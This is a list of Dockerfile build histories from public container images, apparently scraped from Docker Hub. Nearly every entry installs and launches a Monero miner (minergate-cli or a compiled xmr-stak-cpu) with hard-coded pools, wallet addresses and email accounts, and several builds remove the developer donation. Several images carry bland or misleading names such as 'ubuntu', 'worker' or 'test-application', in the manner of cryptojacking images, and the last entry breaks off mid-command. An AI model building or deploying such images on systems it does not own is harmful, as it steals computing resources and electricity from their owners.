herry2015/demodocker1; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["-user princessshilpa2016@gmail.com -bcn"]'
deme3us/dc-jl-x1; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:3333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"42PcauxhF9GVm8Ekeb6c8SV65AFdhEJvkfdv3GxJdMzXSpyjRWDZkXbbMc9zGdwHQ4LifCXoXRB1AEYMYfbrfbgi38HU8xr",/\'         -e \'s/^("pool_password" : ).*,/\\1"dc-jl-x1:deme3us@gmail.com",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
velmoga/worker; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["-user velmoga@gmail.com -xmr"]'
hihackman/mubuntu; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         ca-certificates         wget     && rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["-user hihackman@protonmail.com -xmr"]'
tuha/ubuntu; b'ADD file:96db69a1ba6c80f604d07b14bcbf84445624ad3eb5b0471eddabf09cb7925366 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.3.0-1.5.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake .. -DHWLOC_ENABLE=OFF     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"pool.supportxmr.com:7777",/\'         -e \'s/^("wallet_address" : ).*,/\\1"4AwvCffqPELAzFGMvsYp8GWCgZxNaRa8dMqzQYUJ2h6sKJxC8LmFUBqQsQaR4Fyv9d5JdRerwLFcSgtSUwqa3n73A6YqFHu",/\'         -e \'s/^("pool_password" : ).*,/\\1"x",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
dimsik/karbo; b'ADD file:5aff8c59a70783352d1d5d5b24ddd27b77d9cdc5917992febe9d92901f78a8b3 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nADD dir:85252964e0e26d5e182a374e1acbeb25cdd68cc0a070c4a48f1b030c81ebf5e4 /app\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.2.0-1.4.1\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && cp /app/config.txt /usr/local/etc/config.txt     && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
dimsik/karbo2; b'ADD file:5aff8c59a70783352d1d5d5b24ddd27b77d9cdc5917992febe9d92901f78a8b3 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nADD dir:eb7af97e66018e2bdbdc6a61f09bf748f753a9a0cacdb3517610db8eb6ec423f /app\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0 \t\tgit     && rm -r /var/lib/apt/lists/*\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++ \t\tlibhwloc-dev \t\tlibhwloc5         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && git clone https://github.com/fireice-uk/xmr-stak-cpu --branch dev     && cd xmr-stak-cpu     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cmake -DCMAKE_C_FLAGS="-march=bdver1 -O3 -msse -msse2 -msse3" -DCMAKE_BUILD_TYPE=Release -DHWLOC_ENABLE=ON .     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && cp /app/config.txt /usr/local/etc/config.txt     && rm -r /usr/local/src/xmr-stak-cpu\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
occamy/test-application3; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.3.0-1.5.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake .. -DHWLOC_ENABLE=OFF    && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nEXPOSE 3000/tcp\nADD file:62c60f5278caa63ff56b07dc1ae28218aac039706c802d0799cb64a7d9bbe7d8 /usr/local/etc/config.txt\nRUN adduser --disabled-login --gecos \'xmrstakcpu\' xmrstakcpu\nUSER xmrstakcpu\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
occamy/test-application2; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.3.0-1.5.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake .. -DHWLOC_ENABLE=OFF    && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nEXPOSE 3000/tcp\nADD file:ae9b7a793d875e66917d09776d5b374e80471ccd0783793a83c61283eccae1ab /usr/local/etc/config.txt\nRUN adduser --disabled-login --gecos \'xmrstakcpu\' xmrstakcpu\nUSER xmrstakcpu\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
dimsik/karbo3; b'ADD file:5aff8c59a70783352d1d5d5b24ddd27b77d9cdc5917992febe9d92901f78a8b3 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nADD dir:1a6c4a1dc4ada16ce465e14af7280462833839b4369697a825b6f9cb67753614 /app\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0 \t\tgit     && rm -r /var/lib/apt/lists/*\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++ \t\tlibhwloc-dev \t\tlibhwloc5         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && git clone -b dev https://github.com/fireice-uk/xmr-stak-cpu     && cd xmr-stak-cpu     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cmake -DCMAKE_C_FLAGS="-march=bdver1 -O3 -msse -msse2 -msse3" -DCMAKE_BUILD_TYPE=Release -DHWLOC_ENABLE=ON .     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && cp /app/config.txt /usr/local/etc/config.txt     && rm -r /usr/local/src/xmr-stak-cpu\nENTRYPOINT ["xmr-stak-cpu"]\nCMD ["/usr/local/etc/config.txt"]'
zhylee/sumo-stak-cpu; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0         libhwloc-dev     && rm -r 